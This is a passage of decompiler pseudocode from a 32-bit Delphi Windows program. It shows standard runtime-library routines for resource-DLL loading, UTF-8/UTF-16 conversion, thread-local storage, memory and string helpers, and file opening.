    ExceptionList = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    cbData = 5;
    sub_405978(Filename, 261);
    if ( RegQueryValueExA(phkResult, Filename, 0, 0, Data, &cbData)
      && RegQueryValueExA(phkResult, ValueName, 0, 0, Data, &cbData) )
    {
      Data[0] = 0;
    }
    Data[4] = 0;
    __writefsdword(0, ExceptionList);
    v8 = (int)&loc_405C3C;
    RegCloseKey(phkResult);
  }
  lstrcpynA(Filename, lpString2, 261);
  v8 = 5;
  v7 = LCData;
  ExceptionList = 3;
  ThreadLocale = GetThreadLocale();
  GetLocaleInfoA(ThreadLocale, ExceptionList, v7, v8);
  Library = 0;
  if ( Filename[0] && (LCData[0] || Data[0]) )
  {
    for ( i = &Filename[lstrlenA(Filename)]; *i != 46 && i != Filename; --i )
      ;
    if ( i != Filename )
    {
      v4 = i + 1;
      if ( Data[0] )
      {
        lstrcpynA(v4, (LPCSTR)Data, 261 - (v4 - Filename));
        Library = LoadLibraryExA(Filename, 0, 2u);
      }
      if ( !Library )
      {
        if ( LCData[0] )
        {
          lstrcpynA(v4, LCData, 261 - (v4 - Filename));
          Library = LoadLibraryExA(Filename, 0, 2u);
          if ( !Library )
          {
            LCData[2] = 0;
            lstrcpynA(v4, LCData, 261 - (v4 - Filename));
            return LoadLibraryExA(Filename, 0, 2u);
          }
        }
      }
    }
  }
  return Library;
}
// 405B30: using guessed type CHAR Filename[261];

//----- (00405DA0) --------------------------------------------------------
// attributes: thunk
int __usercall sub_405DA0@<eax>(int a1@<eax>)
{
  return sub_405DA8(a1);
}

//----- (00405DA8) --------------------------------------------------------
int __usercall sub_405DA8@<eax>(int result@<eax>)
{
  int (*v1)(void); // esi
  _DWORD *v2; // ebx

  v1 = (int (*)(void))result;
  v2 = (_DWORD *)dword_42B024;
  if ( dword_42B024 )
  {
    do
    {
      sub_4058F4((int)v2);
      result = v1();
      if ( !(_BYTE)result )
        break;
      v2 = (_DWORD *)*v2;
    }
    while ( v2 );
  }
  return result;
}
// 42B024: using guessed type int dword_42B024;

//----- (00405DD4) --------------------------------------------------------
// attributes: thunk
_DWORD *__usercall sub_405DD4@<eax>(int a1@<eax>)
{
  return sub_405DE4(a1);
}

//----- (00405DDC) --------------------------------------------------------
// attributes: thunk
int __usercall sub_405DDC@<eax>(int a1@<eax>)
{
  return sub_405E04(a1);
}

//----- (00405DE4) --------------------------------------------------------
_DWORD *__usercall sub_405DE4@<eax>(int a1@<eax>)
{
  _DWORD *result; // eax

  result = (_DWORD *)sub_4026E0(8);
  *result = dword_42B028;
  result[1] = a1;
  dword_42B028 = (int)result;
  return result;
}
// 42B028: using guessed type int dword_42B028;

//----- (00405E04) --------------------------------------------------------
int __usercall sub_405E04@<eax>(int result@<eax>)
{
  int v1; // esi
  _DWORD **v2; // edx
  _DWORD *v3; // ecx

  v1 = dword_42B028;
  if ( dword_42B028 && *(_DWORD *)(dword_42B028 + 4) == result )
  {
    dword_42B028 = *(_DWORD *)dword_42B028;
    return sub_402700(v1);
  }
  else
  {
    v2 = (_DWORD **)dword_42B028;
    if ( dword_42B028 )
    {
      while ( 1 )
      {
        v3 = *v2;
        if ( *v2 )
        {
          if ( v3[1] == result )
            break;
        }
        v2 = (_DWORD **)*v2;
        if ( !v2 )
          return result;
      }
      *v2 = (_DWORD *)*v3;
      return sub_402700((int)v3);
    }
  }
  return result;
}
// 42B028: using guessed type int dword_42B028;

//----- (00405E64) --------------------------------------------------------
int __usercall sub_405E64@<eax>(int a1@<eax>)
{
  int result; // eax
  unsigned int v2[6]; // [esp-Ch] [ebp-20h] BYREF
  int i; // [esp+Ch] [ebp-8h]
  int v4; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v4 = a1;
  result = dword_42B028;
  for ( i = dword_42B028; i; i = *(_DWORD *)i )
  {
    v2[2] = (unsigned int)&savedregs;
    v2[1] = (unsigned int)&loc_405E9F;
    v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v2);
    (*(void (__cdecl **)(unsigned int, void *, int *))(i + 4))(v2[0], &loc_405E9F, &savedregs);
    __writefsdword(0, v2[0]);
    result = *(_DWORD *)i;
  }
  return result;
}
// 42B028: using guessed type int dword_42B028;

//----- (00405EC0) --------------------------------------------------------
_DWORD *__usercall sub_405EC0@<eax>(_DWORD *result@<eax>)
{
  *result = dword_42B024;
  dword_42B024 = (int)result;
  return result;
}
// 42B024: using guessed type int dword_42B024;

//----- (00405ED0) --------------------------------------------------------
_DWORD *__usercall sub_405ED0@<eax>(_DWORD *a1@<eax>)
{
  _DWORD *result; // eax
  unsigned int v2[2]; // [esp-Ch] [ebp-10h] BYREF
  int *v3; // [esp-4h] [ebp-8h]
  _DWORD *v4; // [esp+0h] [ebp-4h]
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v4 = a1;
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_405F34;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  sub_405E64(a1[1]);
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_405F3B;
  if ( v4 == (_DWORD *)dword_42B024 )
  {
    result = (_DWORD *)*v4;
    dword_42B024 = *v4;
  }
  else
  {
    result = (_DWORD *)dword_42B024;
    if ( dword_42B024 )
    {
      while ( (_DWORD *)*result != v4 )
      {
        result = (_DWORD *)*result;
        if ( !result )
          return result;
      }
      *result = *v4;
    }
  }
  return result;
}
// 42B024: using guessed type int dword_42B024;

//----- (00405F40) --------------------------------------------------------
_DWORD *__usercall sub_405F40@<eax>(_DWORD *result@<eax>)
{
  int v1; // edx
  _DWORD *v2; // [esp-4h] [ebp-4h]

  v1 = *result;
  if ( *result )
  {
    *result = 0;
    v2 = result;
    (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
    return v2;
  }
  return result;
}

//----- (00405F58) --------------------------------------------------------
_DWORD *__usercall sub_405F58@<eax>(_DWORD *result@<eax>, int a2@<edx>)
{
  int v2; // ecx
  bool v3; // zf
  _DWORD *v4; // [esp-8h] [ebp-8h]

  if ( a2 )
  {
    v4 = result;
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 4))(a2);
    result = v4;
    v2 = *v4;
    *v4 = a2;
    if ( !v2 )
      return result;
  }
  else
  {
    v2 = *result;
    v3 = *result == 0;
    *result = 0;
    if ( v3 )
      return result;
  }
  return (_DWORD *)(*(int (__stdcall **)(int))(*(_DWORD *)v2 + 8))(v2);
}

//----- (00405F84) --------------------------------------------------------
LONG __usercall sub_405F84@<eax>(int a1@<eax>)
{
  return InterlockedDecrement((volatile LONG *)(a1 + 4));
}

//----- (00405F90) --------------------------------------------------------
int __usercall sub_405F90@<eax>(int result@<eax>, void *a2@<ecx>)
{
  if ( *(_DWORD *)(result + 4) )
    sub_4027E8(2, a2);
  return result;
}

//----- (00405FA0) --------------------------------------------------------
_DWORD *__usercall sub_405FA0@<eax>(int a1@<eax>)
{
  _DWORD *result; // eax

  result = sub_4034CC(a1);
  result[1] = 1;
  return result;
}

//----- (00406014) --------------------------------------------------------
unsigned int __userpurge sub_406014@<eax>(int a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>, unsigned int a4)
{
  int v4; // edx
  unsigned int v5; // esi
  unsigned int v6; // ecx
  unsigned int v7; // edx
  unsigned int v8; // edx

  v4 = 0;
  if ( a3 )
  {
    v5 = 0;
    v6 = 0;
    if ( a1 )
    {
      while ( v6 < a4 && v5 < a2 )
      {
        v7 = *(unsigned __int16 *)(a3 + 2 * v6++);
        if ( v7 > 0x7F )
        {
          if ( v7 <= 0x7FF )
          {
            if ( v5 + 2 > a2 )
              break;
            *(_BYTE *)(a1 + v5) = (v7 >> 6) | 0xC0;
            *(_BYTE *)(a1 + v5 + 1) = v7 & 0x3F | 0x80;
            v5 += 2;
          }
          else
          {
            if ( v5 + 3 > a2 )
              break;
            *(_BYTE *)(a1 + v5) = (v7 >> 12) | 0xE0;
            *(_BYTE *)(a1 + v5 + 1) = (v7 >> 6) & 0x3F | 0x80;
            *(_BYTE *)(a1 + v5 + 2) = v7 & 0x3F | 0x80;
            v5 += 3;
          }
        }
        else
        {
          *(_BYTE *)(a1 + v5++) = v7;
        }
      }
      if ( v5 >= a2 )
        v5 = a2 - 1;
      *(_BYTE *)(a1 + v5) = 0;
    }
    else if ( a4 )
    {
      do
      {
        v8 = *(unsigned __int16 *)(a3 + 2 * v6++);
        if ( v8 > 0x7F )
        {
          if ( v8 > 0x7FF )
            ++v5;
          ++v5;
        }
        ++v5;
      }
      while ( v6 < a4 );
    }
    return v5 + 1;
  }
  return v4;
}

//----- (004060F0) --------------------------------------------------------
int __userpurge sub_4060F0@<eax>(int a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>, unsigned int a4)
{
  unsigned int v4; // eax
  unsigned int v5; // esi
  __int16 v6; // cx
  __int16 v7; // cx
  char v8; // dl
  char v9; // dl
  char v10; // dl
  unsigned int v11; // esi
  int v13; // [esp+8h] [ebp-10h]

  if ( !a3 )
    return 0;
  v13 = -1;
  v4 = 0;
  v5 = 0;
  if ( !a1 )
  {
    while ( 1 )
    {
      v10 = *(_BYTE *)(a3 + v5++);
      if ( v10 < 0 )
      {
        if ( (v10 & 0xF0) == 0xF0 )
          return v13;
        if ( (v10 & 0x40) == 0 )
          return v13;
        if ( v5 > a4 )
          return v13;
        if ( (*(_BYTE *)(a3 + v5) & 0xC0) != 0x80 )
          return v13;
        v11 = v5 + 1;
        if ( v11 > a4 || (v10 & 0x20) != 0 && (*(_BYTE *)(a3 + v11) & 0xC0) != 0x80 )
          return v13;
        v5 = v11 + 1;
      }
      ++v4;
      if ( v5 > a4 )
        return v4 + 1;
    }
  }
  while ( v5 < a4 && v4 < a2 )
  {
    v6 = *(unsigned __int8 *)(a3 + v5++);
    if ( (v6 & 0x80u) == 0 )
    {
      *(_WORD *)(a1 + 2 * v4) = v6;
    }
    else
    {
      v7 = v6 & 0x3F;
      if ( v5 > a4 )
        return v13;
      if ( (v7 & 0x20) != 0 )
      {
        v8 = *(_BYTE *)(a3 + v5++);
        if ( (v8 & 0xC0) != 0x80 || v5 > a4 )
          return v13;
        v7 = (v7 << 6) | v8 & 0x3F;
      }
      v9 = *(_BYTE *)(a3 + v5++);
      if ( (v9 & 0xC0) != 0x80 )
        return v13;
      *(_WORD *)(a1 + 2 * v4) = (v7 << 6) | v9 & 0x3F;
    }
    ++v4;
  }
  if ( v4 >= a2 )
    v4 = a2 - 1;
  *(_WORD *)(a1 + 2 * v4) = 0;
  return v4 + 1;
}

//----- (00406234) --------------------------------------------------------
_DWORD *__usercall sub_406234@<eax>(__int16 *a1@<eax>, volatile __int32 *a2@<edx>)
{
  char v4; // zf
  int v5; // eax
  char *v6; // eax
  signed int v7; // eax
  __int16 *v9; // [esp-20h] [ebp-24h]
  unsigned int v10; // [esp-1Ch] [ebp-20h]
  int v11; // [esp-18h] [ebp-1Ch]
  unsigned int v12[2]; // [esp-14h] [ebp-18h] BYREF
  int *v13; // [esp-Ch] [ebp-10h]
  char *v14; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v14 = 0;
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_4062D3;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  sub_40426C(a2);
  sub_404AD8((int)a1, 0);
  if ( !v4 )
  {
    v5 = sub_404A6C((int)a1);
    sub_40484C(&v14, 3 * v5);
    v11 = sub_404A6C((int)a1);
    v10 = sub_404524((int)v14) + 1;
    v9 = sub_404A5C(a1);
    v6 = sub_40471C(v14);
    v7 = sub_406014((int)v6, v10, (int)v9, v11);
    if ( v7 <= 0 )
      sub_40426C(&v14);
    else
      sub_40484C(&v14, v7 - 1);
    sub_4042C0(a2, (__int32)v14);
  }
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_4062DA;
  return sub_40426C(&v14);
}
// 40625D: variable 'v4' is possibly undefined

//----- (004062E0) --------------------------------------------------------
OLECHAR **__usercall sub_4062E0@<eax>(char *a1@<eax>, OLECHAR **a2@<edx>)
{
  OLECHAR *v4; // eax
  __int16 *v5; // eax
  int v6; // eax
  char *v8; // [esp-20h] [ebp-24h]
  unsigned int v9; // [esp-1Ch] [ebp-20h]
  int v10; // [esp-18h] [ebp-1Ch]
  unsigned int v11[2]; // [esp-14h] [ebp-18h] BYREF
  int *v12; // [esp-Ch] [ebp-10h]
  OLECHAR *v13; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v13 = 0;
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_406377;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  sub_404900(a2);
  if ( a1 )
  {
    v4 = (OLECHAR *)sub_404524((int)a1);
    sub_404BA8((int *)&v13, v4);
    v10 = sub_404524((int)a1);
    v9 = sub_404A6C((int)v13) + 1;
    v8 = sub_40471C(a1);
    v5 = sub_404A5C((__int16 *)v13);
    v6 = sub_4060F0((int)v5, v9, (int)v8, v10);
    if ( v6 <= 0 )
      sub_404900(&v13);
    else
      sub_404BA8((int *)&v13, (OLECHAR *)(v6 - 1));
    sub_40493C(a2, v13);
  }
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_40637E;
  return sub_404900(&v13);
}

//----- (00406384) --------------------------------------------------------
OLECHAR **__usercall sub_406384@<eax>(const CHAR *a1@<eax>, volatile __int32 *a2@<edx>)
{
  unsigned int v4[2]; // [esp-14h] [ebp-18h] BYREF
  int *v5; // [esp-Ch] [ebp-10h]
  OLECHAR *v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_4063C7;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_404A4C((int *)&v6, a1);
  sub_406234((__int16 *)v6, a2);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_4063CE;
  return sub_404900(&v6);
}

//----- (004063D4) --------------------------------------------------------
int **__usercall sub_4063D4@<eax>(int **result@<eax>, char **a2@<edx>)
{
  HINSTANCE v3; // eax
  int StringA; // eax
  UINT v5; // [esp-Ch] [ebp-414h]
  CHAR Buffer[1032]; // [esp+0h] [ebp-408h] BYREF

  if ( result )
  {
    if ( (int)result[1] >= 0x10000 )
    {
      return (int **)sub_40445C(a2, (char *)result[1]);
    }
    else
    {
      v5 = (UINT)result[1];
      v3 = (HINSTANCE)sub_40593C(**result);
      StringA = LoadStringA(v3, v5, Buffer, 1024);
      return (int **)sub_40435C(a2, Buffer, StringA);
    }
  }
  return result;
}

//----- (0040642C) --------------------------------------------------------
int sub_40642C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_406476;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_42C5B4 )
  {
    sub_402D80((int)&unk_42C048);
    sub_402D80((int)&unk_42C214);
    sub_402D80((int)&unk_42C3E0);
    sub_401AF0();
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42C5B4: using guessed type int dword_42C5B4;

//----- (00406480) --------------------------------------------------------
void sub_406480()
{
  if ( dword_42C5B4-- == 0 )
  {
    byte_42B008 = 2;
    byte_42C046 = 2;
    dword_42C000 = (int)sub_405168;
    if ( (unsigned __int8)sub_40337C() )
      sub_4033AC();
    sub_403470();
    word_42C04C = -10320;
    word_42C218 = -10320;
    word_42C3E4 = -10320;
    sub_405060();
    dword_42C03C = (int)GetCommandLineA();
    dword_42C038 = sub_40133C();
    dword_42C030 = GetCurrentThreadId();
  }
}
// 42B008: using guessed type char byte_42B008;
// 42C000: using guessed type int dword_42C000;
// 42C030: using guessed type int dword_42C030;
// 42C038: using guessed type int dword_42C038;
// 42C03C: using guessed type int dword_42C03C;
// 42C046: using guessed type char byte_42C046;
// 42C04C: using guessed type __int16 word_42C04C;
// 42C218: using guessed type __int16 word_42C218;
// 42C3E4: using guessed type __int16 word_42C3E4;
// 42C5B4: using guessed type int dword_42C5B4;

//----- (00406514) --------------------------------------------------------
HLOCAL __usercall sub_406514@<eax>(SIZE_T a1@<eax>)
{
  return LocalAlloc_0(0x40u, a1);
}

//----- (00406520) --------------------------------------------------------
int sub_406520()
{
  return 12;
}

//----- (00406528) --------------------------------------------------------
int sub_406528()
{
  int result; // eax
  HLOCAL v1; // eax

  result = sub_406520();
  if ( result )
  {
    if ( TlsIndex == -1 )
      sub_404260();
    v1 = sub_406514(result);
    if ( !v1 )
      sub_404260();
    return TlsSetValue(TlsIndex, v1);
  }
  return result;
}
// 404260: using guessed type void __noreturn sub_404260(void);

//----- (0040656C) --------------------------------------------------------
LPVOID sub_40656C()
{
  LPVOID result; // eax

  if ( !byte_42C704 )
    return (LPVOID)*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex);
  result = TlsGetValue(TlsIndex);
  if ( !result )
  {
    sub_406528();
    result = TlsGetValue(TlsIndex);
    if ( !result )
      return (LPVOID)dword_42C718;
  }
  return result;
}
// 42C704: using guessed type char byte_42C704;
// 42C718: using guessed type int dword_42C718;

//----- (004065AC) --------------------------------------------------------
_DWORD *sub_4065AC()
{
  return sub_405EC0(&a123456789abcde[15]);
}

//----- (004065B8) --------------------------------------------------------
int __usercall sub_4065B8@<eax>(int a1@<eax>, struct _EXCEPTION_REGISTRATION_RECORD *a2@<ebp>)
{
  TlsIndex = 0;
  hmod = GetModuleHandleA_0(0);
  dword_42B090 = (int)hmod;
  dword_42B094 = 0;
  dword_42B098 = 0;
  sub_4065AC();
  return sub_403FD8(a1, (int)&a123456789abcde[15], a2);
}
// 42B090: using guessed type int dword_42B090;
// 42B094: using guessed type int dword_42B094;
// 42B098: using guessed type int dword_42B098;

//----- (004065FC) --------------------------------------------------------
int sub_4065FC()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_406621;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42C714;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42C714: using guessed type int dword_42C714;

//----- (0040662C) --------------------------------------------------------
void sub_40662C()
{
  --dword_42C714;
}
// 42C714: using guessed type int dword_42C714;

//----- (00406634) --------------------------------------------------------
int sub_406634()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_406659;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42C71C;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42C71C: using guessed type int dword_42C71C;

//----- (00406664) --------------------------------------------------------
void sub_406664()
{
  --dword_42C71C;
}
// 42C71C: using guessed type int dword_42C71C;

//----- (00406ACC) --------------------------------------------------------
LPVOID __usercall sub_406ACC@<eax>(UINT a1@<eax>, SIZE_T a2@<edx>)
{
  HGLOBAL v2; // eax

  v2 = GlobalAlloc(a1, a2);
  return GlobalLock(v2);
}

//----- (00406ADC) --------------------------------------------------------
LPVOID __usercall sub_406ADC@<eax>(UINT uFlags@<ecx>, SIZE_T dwBytes@<edx>, const void *a3@<eax>)
{
  HGLOBAL v3; // eax
  HGLOBAL v5; // [esp-Ch] [ebp-Ch]

  v5 = GlobalHandle(a3);
  GlobalUnlock(v5);
  v3 = GlobalReAlloc(v5, dwBytes, uFlags);
  return GlobalLock(v3);
}

//----- (00406AF8) --------------------------------------------------------
HGLOBAL __usercall sub_406AF8@<eax>(const void *a1@<eax>)
{
  HGLOBAL v2; // [esp-4h] [ebp-4h]

  v2 = GlobalHandle(a1);
  GlobalUnlock(v2);
  return GlobalFree(v2);
}

//----- (00406B0C) --------------------------------------------------------
int sub_406B0C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_406B31;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42C720;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42C720: using guessed type int dword_42C720;

//----- (00406B3C) --------------------------------------------------------
void sub_406B3C()
{
  --dword_42C720;
}
// 42C720: using guessed type int dword_42C720;

//----- (00406DD4) --------------------------------------------------------
int sub_406DD4()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_406DF9;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42C724;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42C724: using guessed type int dword_42C724;

//----- (00406E04) --------------------------------------------------------
void sub_406E04()
{
  --dword_42C724;
}
// 42C724: using guessed type int dword_42C724;

//----- (004079D8) --------------------------------------------------------
#error "4079F1: call analysis failed (funcsize=17)"

//----- (004079FC) --------------------------------------------------------
char *__usercall sub_4079FC@<eax>(int a1@<eax>)
{
  char *v2; // esi

  v2 = (char *)sub_4026E0(a1);
  sub_402E48(v2, a1, 0);
  return v2;
}

//----- (00407A1C) --------------------------------------------------------
_DWORD *__usercall sub_407A1C@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int v4; // ebx
  _DWORD *result; // eax
  _BYTE *v6; // edx
  char *i; // esi

  v4 = sub_404524(a1);
  result = sub_40484C(a2, v4);
  v6 = (_BYTE *)a1;
  for ( i = *a2; v4; --v4 )
  {
    LOBYTE(result) = *v6;
    if ( *v6 >= 0x41u && (unsigned __int8)result <= 0x5Au )
      LOBYTE(result) = (_BYTE)result + 32;
    *i = (char)result;
    ++v6;
    ++i;
  }
  return result;
}

//----- (00407A58) --------------------------------------------------------
int __usercall sub_407A58@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>, unsigned int a3@<ecx>)
{
  int result; // eax
  int v6; // edx
  bool v7; // zf
  unsigned int v8; // ecx

  result = 0;
  v6 = a3 & 3;
  v8 = a3 >> 2;
  v7 = v8 == 0;
  do
  {
    if ( !v8 )
      break;
    v7 = *a1++ == *a2++;
    --v8;
  }
  while ( v7 );
  if ( v7 && !memcmp(a1, a2, v6) )
    return 1;
  return result;
}

//----- (00407A78) --------------------------------------------------------
int __usercall sub_407A78@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<edx>)
{
  _BYTE *v2; // esi
  _BYTE *v3; // edi
  _BYTE *v4; // ecx
  bool v5; // zf
  unsigned __int8 v6; // bl
  unsigned __int8 v7; // bh

  v2 = a1;
  v3 = a2;
  if ( a1 )
    a1 = (_BYTE *)*((_DWORD *)a1 - 1);
  if ( a2 )
    a2 = (_BYTE *)*((_DWORD *)a2 - 1);
  v4 = a1;
  if ( a1 > a2 )
    v4 = a2;
  v5 = 1;
  while ( 1 )
  {
    do
    {
      if ( !v4 )
        break;
      v5 = *v2++ == *v3++;
      --v4;
    }
    while ( v5 );
    if ( v5 )
      break;
    v6 = *(v2 - 1);
    if ( v6 >= 0x61u && v6 <= 0x7Au )
      v6 -= 32;
    v7 = *(v3 - 1);
    if ( v7 >= 0x61u && v7 <= 0x7Au )
      v7 -= 32;
    v5 = v6 == v7;
    if ( v6 != v7 )
    {
      a1 = (_BYTE *)v6;
      a2 = (_BYTE *)v7;
      return a1 - a2;
    }
  }
  return a1 - a2;
}

//----- (00407ACC) --------------------------------------------------------
char __usercall sub_407ACC@<al>(_BYTE *a1@<eax>, _BYTE *a2@<edx>)
{
  if ( a1 == a2 )
    goto LABEL_6;
  if ( a1 )
  {
    if ( a2 && *((_DWORD *)a1 - 1) == *((_DWORD *)a2 - 1) && !sub_407A78(a1, a2) )
    {
LABEL_6:
      LOBYTE(a1) = 1;
      return (char)a1;
    }
    LOBYTE(a1) = 0;
  }
  return (char)a1;
}

//----- (00407AF0) --------------------------------------------------------
int __usercall sub_407AF0@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  char *v4; // eax
  int v6; // [esp-Ch] [ebp-14h]
  char *v7; // [esp-8h] [ebp-10h]
  int v8; // [esp-4h] [ebp-Ch]

  v8 = sub_404524((int)a2);
  v7 = sub_40471C(a2);
  v6 = sub_404524((int)a1);
  v4 = sub_40471C(a1);
  return CompareStringA(0x400u, 0, v4, v6, v7, v8) - 2;
}

//----- (00407B28) --------------------------------------------------------
int __usercall sub_407B28@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  char *v4; // eax
  int v6; // [esp-Ch] [ebp-14h]
  char *v7; // [esp-8h] [ebp-10h]
  int v8; // [esp-4h] [ebp-Ch]

  v8 = sub_404524((int)a2);
  v7 = sub_40471C(a2);
  v6 = sub_404524((int)a1);
  v4 = sub_40471C(a1);
  return CompareStringA(0x400u, 1u, v4, v6, v7, v8) - 2;
}

//----- (00407B60) --------------------------------------------------------
int __usercall sub_407B60@<eax>(_BYTE *a1@<eax>)
{
  int v2; // ebx
  int v3; // eax
  bool v4; // cc
  int v5; // eax
  int v6; // eax
  int v7; // edi

  v2 = 0;
  if ( sub_404524((int)a1) && ((unsigned __int8)(*a1 - 65) < 0x1Au || *a1 == 95 || (unsigned __int8)(*a1 - 97) < 0x1Au) )
  {
    v3 = sub_404524((int)a1);
    v4 = v3 < 2;
    v5 = v3 - 2;
    if ( v4 )
    {
LABEL_12:
      LOBYTE(v2) = 1;
    }
    else
    {
      v6 = v5 + 1;
      v7 = 2;
      while ( (unsigned __int8)(a1[v7 - 1] - 48) < 0xAu
           || (unsigned __int8)(a1[v7 - 1] - 65) < 0x1Au
           || a1[v7 - 1] == 95
           || (unsigned __int8)(a1[v7 - 1] - 97) < 0x1Au )
      {
        ++v7;
        if ( !--v6 )
          goto LABEL_12;
      }
    }
  }
  return v2;
}

//----- (00407BC4) --------------------------------------------------------
_DWORD *__usercall sub_407BC4@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int v3; // [esp+0h] [ebp-8h] BYREF
  char v4; // [esp+4h] [ebp-4h]

  v3 = a1;
  v4 = 0;
  return sub_40876C(a2, (int)&dword_407BF0, (int)&v3, 0);
}
// 407BF0: using guessed type int dword_407BF0;

//----- (00407BF4) --------------------------------------------------------
_DWORD *__userpurge sub_407BF4@<eax>(char **a1@<eax>, char a2, int a3)
{
  char *v4; // [esp+0h] [ebp-8h] BYREF
  char v5; // [esp+4h] [ebp-4h]

  v4 = &a2;
  v5 = 16;
  return sub_40876C(a1, (int)&dword_407C24, (int)&v4, 0);
}
// 407C24: using guessed type int dword_407C24;

//----- (00407C28) --------------------------------------------------------
int __usercall Delphi_StrToInt_407C28@<eax>(int a1@<eax>)
{
  int v2; // esi
  char *v4; // [esp+0h] [ebp-14h] BYREF
  int v5; // [esp+4h] [ebp-10h] BYREF
  char v6; // [esp+8h] [ebp-Ch]

  v2 = sub_402E68(a1, &v4);
  if ( v4 )
  {
    v5 = a1;
    v6 = 11;
    sub_4079D8(0, &v5);
  }
  return v2;
}
// 4079D8: using guessed type int __fastcall sub_4079D8(_DWORD, _DWORD);

//----- (00407C64) --------------------------------------------------------
int __usercall sub_407C64@<eax>(int a1@<eax>, int a2@<edx>, char *a3@<ecx>)
{
  int result; // eax
  char *v5; // [esp+0h] [ebp-8h] BYREF

  v5 = a3;
  result = sub_402E68(a1, &v5);
  if ( v5 )
    return a2;
  return result;
}

//----- (00407C7C) --------------------------------------------------------
__int64 __usercall sub_407C7C@<edx:eax>(int a1@<eax>)
{
  __int64 v3; // [esp+0h] [ebp-18h]
  int v4; // [esp+8h] [ebp-10h] BYREF
  int v5; // [esp+Ch] [ebp-Ch] BYREF
  char v6; // [esp+10h] [ebp-8h]

  v3 = sub_405368(a1, &v4);
  if ( v4 )
  {
    v5 = a1;
    v6 = 11;
    sub_4079D8(0, &v5);
  }
  return v3;
}
// 4079D8: using guessed type int __fastcall sub_4079D8(_DWORD, _DWORD);

//----- (00407CD8) --------------------------------------------------------
int __usercall sub_407CD8@<eax>(char *a1@<eax>, char a2@<dl>)
{
  int result; // eax
  unsigned int v4; // esi
  char *v5; // eax
  DWORD v6; // [esp-18h] [ebp-24h]
  DWORD v7; // [esp-14h] [ebp-20h]

  result = -1;
  v4 = a2 & 3;
  if ( v4 <= 2 && (unsigned __int8)(a2 & 0xF0) >> 4 <= 0x40u )
  {
    v7 = dwShareMode[(unsigned __int8)(a2 & 0xF0) >> 4];
    v6 = dwDesiredAccess[v4];
    v5 = sub_40471C(a1);
    return (int)CreateFileA_0(v5, v6, v7, 0, 3u, 0x80u, 0);
  }
  return result;
}
// 42B0F0: using guessed type DWORD dwDesiredAccess[3];
// 42B0FC: using guessed type DWORD dwShareMode[5];

//----- (00407D34) --------------------------------------------------------
